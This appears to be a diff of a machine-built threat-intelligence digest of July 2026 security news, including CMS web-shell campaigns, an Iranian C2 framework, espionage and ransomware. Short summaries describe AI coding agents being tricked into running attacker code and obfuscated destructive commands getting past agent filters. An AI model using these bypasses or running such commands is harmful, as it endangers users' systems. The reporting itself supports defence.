Australian Cyber Security Centre (ACSC) issued an alert warning of a global exploitation campaign targeting various vulnerabilities in content management systems (CMS) and plugins. "As part of this campaign, malicious cyber actors are actively scanning websites for opportunities to deploy web shells, leveraging various vulnerabilities affecting CMS software and plugins," the agency said . "These vulnerabilities primarily allow unauthenticated file upload, remote code execution, server side request forgery or deserialization." Once deployed, the web shells serve as conduits for remote access and control of the targeted web servers. Some of the identified security vulnerabilities are listed below - Sneeit Framework ( CVE-2025-6389 ) WPBookit (WordPress) ( CVE-2025-7852 ) Gravity Forms (WordPress) ( CVE-2025-12352 ) Craft CMS ( CVE-2025-32432 ) Ninja Forms (WordPress) ( CVE-2026-0740 ) Ma
+```
+
+#### Corroborating sources (1)
+
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: iCagenda and Balbooa Forms Joomla Flaws Reportedly Exploited as Zero-Days
+  - Published: 2026-07-13T05:36:02+00:00
+  - Link: https://thehackernews.com/2026/07/icagenda-and-balbooa-forms-joomla-flaws.html
+  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added two maximum-severity security flaws impacting iCagenda and Balbooa extensions for Joomla to its Known Exploited Vulnerabilities (KEV) catalog, following reports of zero-day exploitation in the wild. The vulnerabilities, both rated 10.0 on the CVSS scoring system, are below - CVE-2026-48939 - A vulnerability in the
 
 ### Cluster 843dce4060 — score 19
 
@@ -1149,6 +1211,51 @@ Cloudflare proudly joins the UK government's Cyber Resilience Pledge 2026-07-07 
   - Link: https://blog.cloudflare.com/cloudflare-joins-uk-cyber-resilience-pledge/
   - Summary: The pledge is a voluntary framework inviting organizations to commit to foundational cyber security governance, board-level accountability, and supply chain rigor. For over a decade, Cloudflare has pioneered the core pillars of this framework: democratizing security, leadership accountability, and radical transparency.
 
+### Cluster f47ccb3c50 — score 12
+
+- Title: 99.9% of fixable AI vulnerabilities remain unpatched
+- Source: Help Net Security (cyber_news_breach_reporting)
+- Published: 2026-07-13T04:30:29+00:00
+- Link: https://www.helpnetsecurity.com/2026/07/13/ai-infrastructure-security-risks-report/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: supply_chain
+- affected_industries: government
+- urgency_signals: no_patch_yet
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: supply_chain
+- affected_industries: government
+- urgency_signals: no_patch_yet
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Organizations build, deploy, and operate AI in the cloud, but basic cybersecurity hygiene is often sacrificed for speed, according to Orca Security’s 2026 State of AI Security Report. Building AI without security Fifty-six percent of AI adopters have deployed agent frameworks into production, and 51.5% use AI to build custom applications. Orca also found that 81.2% of companies running AI packages have at least one known vulnerability, and 99.9% of AI vulnerability alerts with an … More → The post 99.9% of fixable AI vulnerabilities remain unpatched appeared first on Help Net Security .
+```
+
+#### Full body
+
+```
+Anamarija Pogorelec , Senior Staff Writer, Help Net Security July 13, 2026 Share 99.9% of fixable AI vulnerabilities remain unpatched Organizations build, deploy, and operate AI in the cloud, but basic cybersecurity hygiene is often sacrificed for speed, according to Orca Security’s 2026 State of AI Security Report. Building AI without security Fifty-six percent of AI adopters have deployed agent frameworks into production, and 51.5% use AI to build custom applications. Orca also found that 81.2% of companies running AI packages have at least one known vulnerability, and 99.9% of AI vulnerability alerts with an available fix remain unpatched. These findings show how quickly AI has become operational infrastructure without a corresponding increase in security maturity. API-based AI is embedded in development workflows with access to codebases, terminals, environment variables, and credentials, creating new attack surfaces. Organizations deploying AI agents also deploy agent frameworks. Every production agent represents a new non-human identity with its own permissions, memory, and potential blast radius. Retrieval-augmented generation (RAG) pipelines allow LLMs to access internal documents, customer data, and proprietary knowledge at query time. More than half of AI cloud service users, operate four or more distinct AI service types. Between 87% and 98% of organizations across the three major cloud providers have not configured customer-managed encryption keys for their AI services. They manage complex AI ecosystems connected to enterprise data, cloud services, identities, and production workflows. “AI has introduced an entirely new operational layer into cloud environments,” said Nir Mishal , CISO at Orca Security. “Organizations now have agents making decisions, vector databases connected to enterprise data, and AI services spread across multiple cloud providers. Security teams need unified visibility across that entire environment, paired with automated prevention, to understand where risk actually exists and stop attackers before damage is done.” Securing the AI supply chain Attackers are moving across five layers of the AI stack: package registries, model hubs, developer tools, agent frameworks, and brand trust. Technologies across these layers are widely deployed in production environments. Eighty-one percent of companies running AI packages have at least one known vulnerability, and 74.1% have at least one critical CVE. AI packages inherit vulnerabilities disclosed over the past five years, including CVEs published during the last 12 months, exposing production environments to both old and new threats. A vulnerable library embedded in a dependency graph often outlives the patch cycle. AI workloads inherit the same problem despite release cycles that assume dependencies remain up to date. In 2024, organizations often deprioritized patching AI packages because many vulnerabilities were considered difficult to exploit. Now, 99.9% of AI vulnerability alerts with an available fix remain unpatched. Orca groups new AI-related packages vulnerabilities into three categories: SDKs for accessing hosted AI models, frameworks for building AI agents and integrations, and the rapidly expanding Model Context Protocol (MCP) ecosystem. Managing AI agents and RAG Despite the governance response making progress, adoption is not so many AI agents run with default permissions, logging, and no runtime separation from production systems. This gives attackers opportunity to weaponize them to execute commands and move laterally through the AI layer. Sixty-four percent of AI adopters have deployed vector databases that connect LLMs to internal documents, customer records, and proprietary knowledge. Businesses using retrieval-augmented generation (RAG) operate an average of 3.78 vector databases, making it more difficult to enforce consistent security policies across platforms, deployment models, and access methods. Closing the governance gap AI sp
+```
+
+#### Corroborating sources (1)
+
+- **Help Net Security** (cyber_news_breach_reporting)
+  - Title: 99.9% of fixable AI vulnerabilities remain unpatched
+  - Published: 2026-07-13T04:30:29+00:00
+  - Link: https://www.helpnetsecurity.com/2026/07/13/ai-infrastructure-security-risks-report/
+  - Summary: Organizations build, deploy, and operate AI in the cloud, but basic cybersecurity hygiene is often sacrificed for speed, according to Orca Security’s 2026 State of AI Security Report. Building AI without security Fifty-six percent of AI adopters have deployed agent frameworks into production, and 51.5% use AI to build custom applications. Orca also found that 81.2% of companies running AI packages have at least one known vulnerability, and 99.9% of AI vulnerability alerts with an … More → The post 99.9% of fixable AI vulnerabilities remain unpatched appeared first on Help Net Security .
+
 ### Cluster 4480c0b8b7 — score 12
 
 - Title: GodDamn Ransomware Uses PoisonX Driver to Disable Endpoint Defenses
@@ -1354,68 +1461,6 @@ Vulnerabilities & Threats Cyber Risk Application Security Cyberattacks & Data Br
   - Link: https://www.darkreading.com/vulnerabilities-threats/citrixbleed-ing-again-netscaler-vulnerability-under-attack
   - Summary: Attackers wasted little time targeting the latest memory disclosure flaw in Citrix's NetScaler products, after researchers published a proof-of-concept exploit (PoC).
 
-### Cluster 8fe87a7b65 — score 11
-
-- Title: Enforce zero data retention on Amazon Bedrock with Bedrock Projects and service control policies
-- Source: AWS Security Blog (cloud_identity_infrastructure)
-- Published: 2026-07-07T18:18:52+00:00
-- Link: https://aws.amazon.com/blogs/security/enforce-zero-data-retention-on-amazon-bedrock-with-bedrock-projects-and-service-control-policies/
-- Fetch status: ok
-- Member count: 6
-- Corroborating source count: 5
-- Strong signals: Anthropic/Claude
-
-#### Cluster taxonomy (union across members)
-- threat_categories: data_breach, ransomware_extortion
-- affected_products: AWS, Anthropic/Claude, Linux kernel, OpenAI/ChatGPT
-- content_type: news_report
-- confidence_tier: tier_2_operator, tier_3_analysis, tier_4_news
-
-#### Primary article taxonomy
-- affected_products: AWS, Anthropic/Claude
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-With the introduction of models that require data sharing with third-party providers—such as Claude Fable 5—organizations need a way to centrally enforce data retention policies. Amazon Bedrock gives you control over whether your prompts and model outputs are retained after an inference request completes. You might need a way to enforce your retention settings across […]
-```
-
-#### Full body
-
-```
-AWS Security Blog Enforce zero data retention on Amazon Bedrock with Bedrock Projects and service control policies With the introduction of models that require data sharing with third-party providers—such as Claude Fable 5—organizations need a way to centrally enforce data retention policies. Amazon Bedrock gives you control over whether your prompts and model outputs are retained after an inference request completes. You might need a way to enforce your retention settings across all accounts and have granular control of project data retention when compatible with the selected model. In this blog post, I walk you through how Amazon Bedrock data retention modes work, the tools available for managing retention—including Amazon Bedrock Projects and service control policies (SCPs)—and how to verify your policy settings are working correctly. In this post, you will learn: How Amazon Bedrock data retention modes work and what each mode means for your data How to use Amazon Bedrock Projects with compatible models to isolate workloads with different retention needs How to write and deploy an SCP that prevents anyone in your organization from enabling data sharing How data retention modes interact with cross-Region inference profiles How to verify your configuration is working correctly Understanding data retention modes You can use Amazon Bedrock to control data retention through a mode setting on your account. This determines what happens to your prompts and outputs after each inference request, which is important to understand as you assess your compliance needs. Not all models require data retention or data sharing, and you might continue to use Amazon Bedrock with models that don’t require data retention or data sharing. See the Amazon Bedrock documentation for the current list of models that require data retention or data sharing. Ultimately, it’s your responsibility as the customer to select models that align with your compliance needs. Important Note : To help stop the dissemination of child sexual abuse material (“CSAM”), Amazon Bedrock uses automated mechanisms to identify CSAM in model input/output. We may store and review flagged content to determine if it is CSAM for reporting purposes, even when mode is none. The following modes govern how Amazon Bedrock handles your data: Mode Behavior Data shared with provider none Zero data retention. Prompts and responses are processed and immediately discarded. No default No data is shared with model providers. Some models might require data retention for trust and safety checks for up to 30 days. Consult the model’s terms for specifics. This mode also allows APIs that inherently require retention (for example, Batch API, Responses API with store=true). Models that support zero retention will still operate with zero retention. No inherit No explicit setting applied, defers to the next higher scope (project defers to account defers to service default). This is the default for new accounts. No provider_data_share Data is shared with the model provider and retained for up to 30 days for trust and safety. Yes Understanding mode as a ceiling, not a floor The most important concept to understand: your configured mode is the upper limit of retention you’re willing to accept ; it is not what every request will use. Setting your account to provider_data_share doesn’t mean all your requests suddenly start retaining and sharing data. Models that support zero data retention will still operate with zero retention regardless of your account-level setting. Think of it as a permissions ceiling: Your account mode Model you invoke What happens provider_data_share Claude Sonnet (supports none) Zero retention, Sonnet doesn’t require data sharing or data retention provider_data_share Claude Fable 5 (requires provider_data_share ) Data retained for up to 30 days and might be shared with provider, Fable 5 requires data sharing and data retention none Claude Sonnet (supports none ) Zero retention, no data s
-```
-
-#### Corroborating sources (5)
-
-- **AWS Security Blog** (cloud_identity_infrastructure)
-  - Title: Enforce zero data retention on Amazon Bedrock with Bedrock Projects and service control policies
-  - Published: 2026-07-07T18:18:52+00:00
-  - Link: https://aws.amazon.com/blogs/security/enforce-zero-data-retention-on-amazon-bedrock-with-bedrock-projects-and-service-control-policies/
-  - Summary: With the introduction of models that require data sharing with third-party providers—such as Claude Fable 5—organizations need a way to centrally enforce data retention policies. Amazon Bedrock gives you control over whether your prompts and model outputs are retained after an inference request completes. You might need a way to enforce your retention settings across […]
-- **Simon Willison** (ai_security_agentic_risk)
-  - Title: sqlite-utils 4.0rc3
-  - Published: 2026-07-06T05:40:08+00:00
-  - Link: https://simonwillison.net/2026/Jul/6/sqlite-utils/#atom-everything
-  - Summary: Release: sqlite-utils 4.0rc3 I hoped to release sqlite-utils 4.0 stable this weekend, but as I worked through the backlog of issues and PRs with a combination of Claude Fable 5 and GPT-5.5 the changelog since rc2 kept getting bigger . The biggest new feature is support for introspecting and creating compound foreign keys - a feature that involves a subtle breaking change to table.foreign_keys and hence needed to land for the 4.0 stable release. sqlite-utils also now follows SQLite's convention for case insensitive column names, which turned out to touch a bunch of different places at once . Tags: projects , sqlite , sqlite-utils , annotated-release-notes , gpt , claude-mythos-fable
-- **Risky Business News** (practitioner_analysis)
-  - Title: Risky Bulletin: EU official’s phone infected with Pegasus
-  - Published: 2026-07-06T04:21:28+00:00
-  - Link: https://risky.biz/RBNEWS586/
-  - Summary: A European MP’s phone was infected by Pegasus spyware, Android drops its PIN guessing limit from 1,800 attempts to 20, Alibaba bans employees from using Claude at work, and there’s a new vulnerability in the Linux kernel.
-- **SecurityWeek** (cyber_news_breach_reporting)
-  - Title: In Other News: DHS Database Hacked, Adobe Boosts Patch Cadence, Canada Disrupts Ransomware Ops
-  - Published: 2026-07-10T15:01:19+00:00
-  - Link: https://www.securityweek.com/in-other-news-dhs-database-hacked-adobe-boosts-patch-cadence-canada-disrupts-ransomware-ops/
-  - Summary: Other noteworthy stories that might have slipped under the radar: Abnormal AI sued by Anthropic, AssuranceAmerica data breach affects 7 million people, NSA brings back TAO. The post In Other News: DHS Database Hacked, Adobe Boosts Patch Cadence, Canada Disrupts Ransomware Ops appeared first on SecurityWeek .
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: Top AI Agents Built to Catch Malicious Code Can Be Tricked Into Running It
-  - Published: 2026-07-09T05:15:02+00:00
-  - Link: https://thehackernews.com/2026/07/friendly-fire-ai-agents-built-to-catch.html
-  - Summary: Ask an AI coding agent to scan open-source code for security holes, and it might run the attacker's code on your own machine instead. That is the finding in a proof-of-concept published Wednesday by the AI Now Institute, an attack it calls "Friendly Fire." It works against Anthropic's Claude Code and OpenAI's Codex when either is running in an autonomous mode that approves its own
-
 ### Cluster bfabcf1e25 — score 10
 
 - Title: No Manners Here: The Ruthless Rise of The Gentlemen Ransomware
@@ -1460,49 +1505,6 @@ Threat Research Center Insights Hospitality Hacks and Retail Reality Checks Hosp
   - Published: 2026-07-10T22:00:39+00:00
   - Link: https://unit42.paloaltonetworks.com/the-gentlemen-ransomware/
   - Summary: Unit 42 explores The Gentlemen ransomware operations, revealing the affiliate model driving its rapid growth. Learn more here. The post No Manners Here: The Ruthless Rise of The Gentlemen Ransomware appeared first on Unit 42 .
-
-### Cluster 4a0789d0ad — score 10
-
-- Title: One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement
-- Source: SentinelOne Labs (threat_research_primary)
-- Published: 2026-07-09T12:55:00+00:00
-- Link: https://www.sentinelone.com/labs/one-target-china-india-espionage-converge-on-pakistani-law-enforcement/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: apt_espionage
-- affected_industries: government
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: apt_espionage
-- affected_industries: government
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-China and India ran separate espionage operations against the same Pakistani police force, each drawn by different stakes in Pakistan's internal security.
-```
-
-#### Full body
-
-```
-Adversary One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement Aleksandar Milenkoski & Julian-Ferdinand Vögele / July 9, 2026 Executive Summary SentinelLABS has been tracking sustained cyberespionage activity against several Pakistani law enforcement organizations, taking place from February 2024 to April 2026. All these actors converged on Balochistan Police over this period, bringing both a partner and an adversary of Pakistan to the same police force in a province shaped by a separatist insurgency and the regional tensions it has drawn in. At Balochistan Police, the compromised assets included servers hosting web applications that manage police and citizen data, such as criminal and biometric records. A suspected China-nexus actor planted implants in one of the web applications, which serves both police staff and citizens, weaponizing a tool of Pakistan’s police digitalization against its users. Pakistani law enforcement organizations attract cyber collection because they hold information on Pakistan’s internal security that regional powers have an incentive to pursue. For China, the likely primary concern is the safety of its nationals, the target of repeated deadly attacks Pakistan has failed to prevent, leading Beijing to assess that threat for itself rather than rely on its partner alone. For India, the strongest motive is probably its rivalry with Pakistan, with Balochistan Police offering insight into the security posture of a Pakistani province prominent in wider mutual accusations over cross-border support for militancy. Overview Suspected China- and India-nexus threat actors carried out intrusions into several Pakistani law enforcement organizations between 2024 and 2026. Our analysis of C2 netflow data revealed that suspected China- and India-nexus threat actors operating PlugX, ShadowPad, Cobalt Strike, and Remcos infrastructure have converged on this victim class. All of these threat actors were active against Balochistan Police, the principal police force serving the Pakistani province of the same name, at various points between 2024 and 2026. The affected assets spanned network appliances and servers hosting web applications that manage biometric records, hotel and tenant registrations linked to national identity records, criminal case files, and personnel records. A suspected China-nexus threat actor also compromised one of these web applications, deploying custom implants masquerading as a portal update. The application is used by police staff and by citizens interacting with law enforcement through it, and the compromise put both user groups within the threat actor’s reach. When multiple cyberespionage actors operate against law enforcement institutions of a single state, the convergence itself is a signal of target value. What draws them is a particular kind of institution: one that holds the government’s internal security picture, what it knows about the threats inside its borders, and how it acts against them. Each of the states suspected to be behind the activities covered in this post has its own stake in the threats monitored by Pakistani law enforcement. Strategic Motives | Distrust and Accusations The China-nexus activity is most likely motivated primarily by concern for the safety of Chinese nationals. Their presence across Pakistan is substantial, tied in large part to the China-Pakistan Economic Corridor (CPEC), Beijing’s flagship Belt and Road infrastructure program in the country. Chinese nationals have been the target of repeated deadly attacks, some of which were claimed by the Balochistan Liberation Army (BLA), a Baloch separatist group opposed to China’s presence in the Pakistani resource-rich southwest. Notable attacks include the October 2024 Karachi airport attack and the March 2024 suicide bombing in northwestern Pakistan. The attacks have fueled explicit Chinese dissatisfaction with Pakistani counter-militancy performance. In October 2024, China’s Ambass
-```
-
-#### Corroborating sources (1)
-
-- **SentinelOne Labs** (threat_research_primary)
-  - Title: One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement
-  - Published: 2026-07-09T12:55:00+00:00
-  - Link: https://www.sentinelone.com/labs/one-target-china-india-espionage-converge-on-pakistani-law-enforcement/
-  - Summary: China and India ran separate espionage operations against the same Pakistani police force, each drawn by different stakes in Pakistan's internal security.
 
 ### Cluster b835d1d4b1 — score 10
 
@@ -1551,6 +1553,145 @@ Share Link copied to clipboard! Tags Malware Threats intelligence Cyberattacker 
   - Published: 2026-07-09T15:00:00+00:00
   - Link: https://www.microsoft.com/en-us/security/blog/2026/07/09/gigawiper-anatomy-of-a-destructive-backdoor-assembled-from-multiple-malware/
   - Summary: GigaWiper is a destructive backdoor that combines multiple wiping and ransomware-like capabilities into a single operational platform. This blog analyzes how the malware incorporates code from several previously separate malware families and provides guidance to help defenders detect and defend against similar threats. The post GigaWiper: Anatomy of a destructive backdoor assembled from multiple malware appeared first on Microsoft Security Blog .
+
+### Cluster 3ee1d54d9d — score 10
+
+- Title: Cavern Manticore: Exposing Iran-Linked Modular C2 Framework
+- Source: Check Point Research (threat_research_primary)
+- Published: 2026-07-06T12:25:02+00:00
+- Link: https://research.checkpoint.com/2026/cavern-manticore-exposing-iran-linked-modular-c2-framework/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: active_exploitation, apt_espionage, ransomware_extortion
+- actor_attribution: MuddyWater
+- affected_industries: financial_services, government
+- affected_products: Android, OpenAI/ChatGPT
+- urgency_signals: actively_exploited
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, apt_espionage, active_exploitation
+- actor_attribution: MuddyWater
+- affected_industries: financial_services, government
+- affected_products: Android, OpenAI/ChatGPT
+- urgency_signals: actively_exploited
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+Key Points Introduction Since early 2026, Check Point Research (CPR) has tracked a new modular command-and-control framework used by Cavern Manticore, an Iran-nexus APT group primarily targeting Israeli organizations, with a focus on IT providers, and government sectors. Cavern Manticore is an Iran MOIS (Ministry of Intelligence and Security)-linked actor, with links to the OilRig […] The post Cavern Manticore: Exposing Iran-Linked Modular C2 Framework appeared first on Check Point Research .
+```
+
+#### Full body
+
+```
+CATEGORIES AI Research 17 Android Malware 23 Artificial Intelligence 5 ChatGPT 3 Check Point Research Publications 462 Cloud Security 1 CPRadio 44 Crypto 2 Data & Threat Intelligence 2 Data Analysis 0 Demos 22 Global Cyber Attack Reports 415 How To Guides 13 Ransomware 5 Russo-Ukrainian War 1 Security Report 1 Threat and data analysis 0 Threat Research 175 Web 3.0 Security 11 Wipers 0 Cavern Manticore: Exposing Iran-Linked Modular C2 Framework July 6, 2026 https://research.checkpoint.com/2026/cavern-manticore-exposing-iran-linked-modular-c2-framework/ Note: SysAid was not compromised, and no SysAid vulnerability was involved. The attacker had already gained access to the victim environment and abused a legitimate software-deployment feature to deploy malware onto another machine within it. Key Points Check Point Research (CPR) tracks ‘ Cavern Manticore ’ as an Iran-nexus threat actor operating against Israeli targets , with a focus on the government and IT sectors. Cavern Manticore shares technical overlaps with other Iranian MOIS (Ministry of Intelligence and Security)-linked threat actors, including MuddyWater and Lyceum . CPR observed a modular C2 framework in the wild, with all samples built on top of .NET but compiled into different output formats. These components are used as Cavern agent and Cavern modules . The framework’s anti-analysis posture relies on uncommon .NET compilation formats ( Mixed-Mode C++/CLI and Native AOT ) that force reverse engineers into multiple toolsets and metadata-reconstruction workflows, together with per-module AppDomain isolation as an anti-forensics measure. In malware-engine coverage, the majority of observed samples score zero or very low detection rates on VirusTotal. Post-exploitation modules provide the threat actor with extended capabilities , including file system and database browsing, LDAP querying, network reconnaissance, and tunneling. In multiple observed intrusions, the initial foothold was achieved through abuse of existing Remote Monitoring and Management ( RMM ) software deployed in the targeted organization. Introduction Since early 2026, Check Point Research (CPR) has tracked a new modular command-and-control framework used by Cavern Manticore , an Iran-nexus APT group primarily targeting Israeli organizations, with a focus on IT providers, and government sectors. Cavern Manticore is an Iran MOIS (Ministry of Intelligence and Security)-linked actor, with links to the OilRig subgroup named Lyceum . The framework reflects a mature and adaptable toolset built around a shared .NET foundation, while using multiple compilation formats across different components, including .NET Framework , .NET Mixed-Mode C++/CLI , and .NET Native AOT . The compilation format itself becomes the anti-analysis layer that forces reverse engineers into multiple toolsets and metadata-reconstruction workflows. During our investigation, we observed both Cavern agents and Cavern modules in the wild, highlighting a modular architecture that separates core communication capabilities from mission-specific post-exploitation functionality. This design allows the operators to tailor deployments per victim environment, limit what defenders and analysts can recover from any single victim and extend access after compromise through specialized modules for reconnaissance, data access, tunneling, and lateral movement. Figure 1: Cavern Modules Evade Malware Engines. Technical Analysis: Cavern – A Modular .NET C2 Framework 1. Cavern at a Glance Cavern is a modular post-exploitation C2 framework built entirely on .NET, but deliberately compiled into three different binary formats: .NET Framework ( IL-only ), Mixed-Mode C++/CLI ( IL + Native ), and .NET 8 NativeAOT ( Native-only ). The recovered execution chain begins with SysAid’s software update feature, which the actor leverages to deploy a WinDirStat DLL sideloading package to C:\ProgramData\WinDir\WinDirStat.exe . The legitimate WinDirStat.exe binary loads the tr
+```
+
+#### Corroborating sources (1)
+
+- **Check Point Research** (threat_research_primary)
+  - Title: Cavern Manticore: Exposing Iran-Linked Modular C2 Framework
+  - Published: 2026-07-06T12:25:02+00:00
+  - Link: https://research.checkpoint.com/2026/cavern-manticore-exposing-iran-linked-modular-c2-framework/
+  - Summary: Key Points Introduction Since early 2026, Check Point Research (CPR) has tracked a new modular command-and-control framework used by Cavern Manticore, an Iran-nexus APT group primarily targeting Israeli organizations, with a focus on IT providers, and government sectors. Cavern Manticore is an Iran MOIS (Ministry of Intelligence and Security)-linked actor, with links to the OilRig […] The post Cavern Manticore: Exposing Iran-Linked Modular C2 Framework appeared first on Check Point Research .
+
+### Cluster cad05b2d4e — score 10
+
+- Title: 6th July – Threat Intelligence Report
+- Source: Check Point Research (threat_research_primary)
+- Published: 2026-07-06T12:01:54+00:00
+- Link: https://research.checkpoint.com/2026/6th-july-threat-intelligence-report-2/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: credential_theft, data_breach, phishing_social_eng, ransomware_extortion
+- affected_industries: aviation_defense, financial_services, legal_professional, manufacturing_industrial
+- affected_products: Android, Citrix, Linux kernel
+- cve_ids: CVE-2026-46242, CVE-2026-46817, CVE-2026-8037, CVE-2026-8451
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft, data_breach
+- affected_industries: financial_services, manufacturing_industrial, aviation_defense, legal_professional
+- affected_products: Linux kernel, Citrix, Android
+- cve_ids: CVE-2026-46817, CVE-2026-46242, CVE-2026-8451, CVE-2026-8037
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+For the latest discoveries in cyber research for the week of 6th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES River Bank & Trust, a US financial institution, has experienced a ransomware incident after an unauthorized actor accessed the network of parent company River Financial Corporation on June 16. The bank found […] The post 6th July – Threat Intelligence Report appeared first on Check Point Research .
+```
+
+#### Full body
+
+```
+FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 6th July – Threat Intelligence Report July 6, 2026 https://research.checkpoint.com/2026/6th-july-threat-intelligence-report-2/ For the latest discoveries in cyber research for the week of 6th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES River Bank & Trust, a US financial institution, has experienced a ransomware incident after an unauthorized actor accessed the network of parent company River Financial Corporation on June 16. The bank found ransomware on portions of its server environment and is assessing whether personal data was accessed or exfiltrated. Indra Group, a Spanish defense, aerospace, and technology contractor and NATO cyber coalition member, has confirmed a ransomware attack affecting one subsidiary. The Gentlemen ransomware gang threatened to leak allegedly stolen data, while Indra said the incident was contained and that service continuity was maintained. Check Point Threat Emulation and Harmony Endpoint provide protection against this threat Nidec, a Japanese electric motor and industrial manufacturer, has disclosed a ransomware attack affecting the network of its Taiwanese subsidiary, Nidec Chaun Choung Technology. BlackField group claimed responsibility and alleged theft of more than two terabytes of corporate data, including employee, financial, procurement, manufacturing, legal, and IT records. US insurance firm Aflac has disclosed a data breach affecting its Japan operations after attackers accessed its policyholder portal between June 15 and June 25. Personal and financial data of nearly 4.4 million customers was exposed, including policyholder information and premium payment account details. AI THREATS Check Point Research has demonstrated a browser-native ransomware technique generated by a large language model that abuses Chrome’s File System Access API. A fake image-enhancement page convinces users to grant folder access, then reads, exfiltrates, and encrypts photos inside the browser on Android and Windows. Researchers examined shell command injection weaknesses in open-source AI coding agents, finding that 10 out of 11 popular tools failed to block obfuscated destructive commands. Simple rewrites bypassed filters and enabled destructive actions, including file deletion, while only the Continue agent properly parsed commands. Researchers warned that attackers are exploiting LLM phantom squatting by registering AI-generated domains to hijack traffic and deliver phishing. They recorded 250,000 hallucinated domains and subsequent registrations, including an AI-built phishing kit, Montana Empire, using a postal-service domain for credential theft. VULNERABILITIES AND PATCHES Oracle E-Business Suite is affected by CVE-2026-46817, a critical remote code execution flaw reportedly exploited against about 950 internet-exposed instances worldwide. Successful exploitation can give attackers control over ERP systems. Check Point IPS provides protection against this threat (Oracle E-Business Suite Authentication Bypass (CVE-2026-46817)) Linux kernel maintainers patched CVE-2026-46242, a Bad Epoll privilege escalation flaw affecting Linux servers, desktops, and Android devices. The race-condition use-after-free vulnerability allows an unprivileged local user to gain root access, and a public exploit demonstrated reliable exploitation against vulnerable systems. Citrix has addressed CVE-2026-8451, a NetScaler ADC and NetScaler Gateway memory disclosure flaw affecting SAML Identity Provider configurations. Active exploitation was observed less than 24 hours after disclosure, with attacks able to leak session tokens from vulnerable appliances. Check Point IPS provides protection against this threat (Citrix NetScaler Out Of Bounds Read (CVE-2026-8451)) Progress has addressed CVE-2026-8037, a critical OS command injection flaw in Kemp LoadMaster load balancers with a CVSS score of 9.6. Exploitation attempts began
+```
+
+#### Corroborating sources (1)
+
+- **Check Point Research** (threat_research_primary)
+  - Title: 6th July – Threat Intelligence Report
+  - Published: 2026-07-06T12:01:54+00:00
+  - Link: https://research.checkpoint.com/2026/6th-july-threat-intelligence-report-2/
+  - Summary: For the latest discoveries in cyber research for the week of 6th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES River Bank & Trust, a US financial institution, has experienced a ransomware incident after an unauthorized actor accessed the network of parent company River Financial Corporation on June 16. The bank found […] The post 6th July – Threat Intelligence Report appeared first on Check Point Research .
+
+### Cluster 4a0789d0ad — score 10
+
+- Title: One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement
+- Source: SentinelOne Labs (threat_research_primary)
+- Published: 2026-07-09T12:55:00+00:00
+- Link: https://www.sentinelone.com/labs/one-target-china-india-espionage-converge-on-pakistani-law-enforcement/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: apt_espionage
+- affected_industries: government
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: apt_espionage
+- affected_industries: government
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+China and India ran separate espionage operations against the same Pakistani police force, each drawn by different stakes in Pakistan's internal security.
+```
+
+#### Full body
+
+```
+Adversary One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement Aleksandar Milenkoski & Julian-Ferdinand Vögele / July 9, 2026 Executive Summary SentinelLABS has been tracking sustained cyberespionage activity against several Pakistani law enforcement organizations, taking place from February 2024 to April 2026. All these actors converged on Balochistan Police over this period, bringing both a partner and an adversary of Pakistan to the same police force in a province shaped by a separatist insurgency and the regional tensions it has drawn in. At Balochistan Police, the compromised assets included servers hosting web applications that manage police and citizen data, such as criminal and biometric records. A suspected China-nexus actor planted implants in one of the web applications, which serves both police staff and citizens, weaponizing a tool of Pakistan’s police digitalization against its users. Pakistani law enforcement organizations attract cyber collection because they hold information on Pakistan’s internal security that regional powers have an incentive to pursue. For China, the likely primary concern is the safety of its nationals, the target of repeated deadly attacks Pakistan has failed to prevent, leading Beijing to assess that threat for itself rather than rely on its partner alone. For India, the strongest motive is probably its rivalry with Pakistan, with Balochistan Police offering insight into the security posture of a Pakistani province prominent in wider mutual accusations over cross-border support for militancy. Overview Suspected China- and India-nexus threat actors carried out intrusions into several Pakistani law enforcement organizations between 2024 and 2026. Our analysis of C2 netflow data revealed that suspected China- and India-nexus threat actors operating PlugX, ShadowPad, Cobalt Strike, and Remcos infrastructure have converged on this victim class. All of these threat actors were active against Balochistan Police, the principal police force serving the 